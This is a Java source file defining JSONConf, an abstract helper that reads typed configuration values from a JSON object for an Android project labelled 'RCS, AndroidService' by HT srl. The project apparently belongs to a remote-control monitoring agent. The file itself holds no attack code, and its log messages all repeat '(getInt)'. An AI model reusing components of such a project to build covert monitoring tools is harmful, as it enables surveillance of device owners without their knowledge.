/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : RunningConf.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.conf;

import org.json.JSONException;
import org.json.JSONObject;

import com.android.service.auto.Cfg;
import com.android.service.util.Check;

/**
 * Interface used by AgentConf and EventConf
 * 
 * @author zeno
 * 
 */
public abstract class JSONConf {
	private static final String TAG = "JSONConf";
	
	protected String type;
	
	/** Parameters. */
	private final JSONObject params;
	
	public JSONConf(String type, JSONObject params){
		this.params=params;
		this.type = type;
		
	}
	
	public String getType(){
		return type;
	}
	
	public int getInt(String key) throws ConfigurationException {
		try {
			return params.getInt(key);
		} catch (JSONException e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (getInt) Error: " + e);
			}

			throw new ConfigurationException();
		}
	}

	public String getString(String key) throws ConfigurationException {
		try {
			return params.getString(key);
		} catch (JSONException e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (getInt) Error: " + e);
			}

			throw new ConfigurationException();
		}
	}

	public boolean getBoolean(String key) throws ConfigurationException {
		try {
			return params.getBoolean(key);
		} catch (JSONException e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (getInt) Error: " + e);
			}

			throw new ConfigurationException();
		}
	}

	public String getArrayString(String key, String subkey) throws ConfigurationException {
		try {
			JSONObject hash = params.getJSONObject(key);
			return hash.getString(subkey);
		} catch (JSONException e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (getInt) Error: " + e);
			}

			throw new ConfigurationException();
		}
	}
	
	public boolean has(String name) {		
		return params.has(name);
	}
}
